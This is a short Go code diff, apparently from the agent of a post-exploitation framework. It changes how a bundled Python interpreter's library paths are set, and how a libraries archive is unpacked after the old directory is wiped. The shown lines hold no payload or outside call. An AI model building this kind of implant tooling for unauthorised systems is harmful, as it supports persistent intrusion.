@@ -25,8 +25,8 @@ var (
 
 	// run python scripts with this command
 	// LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/home/u/alpine/lib PYTHONPATH="/tmp/python3.9:/tmp/python3.9/site-packages:/tmp/python3.9/lib-dynload" /tmp/python3
-	PythonCmd = fmt.Sprintf("PYTHONPATH=%s PYTHONHOME=%s LD_LIBRARY_PATH=$LD_LIBRARY_PATH:%s %s",
-		PythonPath, PythonPath, emp3r0r_data.AgentRoot+"/lib",
+	PythonCmd = fmt.Sprintf("PYTHONPATH=%s PYTHONHOME=%s LD_LIBRARY_PATH=%s %s",
+		PythonPath, PythonLib, emp3r0r_data.LibPath,
 		emp3r0r_data.UtilsPath+"/python3")
 
 	// run python itself with this script
@@ -56,7 +56,8 @@ func VaccineHandler() (out string) {
 		log.Printf("Unarchive: %v", err)
 		return fmt.Sprintf("Unarchive: %v", err)
 	}
-	if err = archiver.Unarchive(emp3r0r_data.AgentRoot+"/libs.tar.xz", emp3r0r_data.AgentRoot); err != nil {
+	os.RemoveAll(emp3r0r_data.LibPath) // archiver fucking aborts when files already exist
+	if err = archiver.Unarchive(emp3r0r_data.UtilsPath+"/libs.tar.xz", emp3r0r_data.AgentRoot); err != nil {
 		log.Printf("Unarchive: %v", err)
 		out = fmt.Sprintf("Unarchive libs: %v", err)
 	}
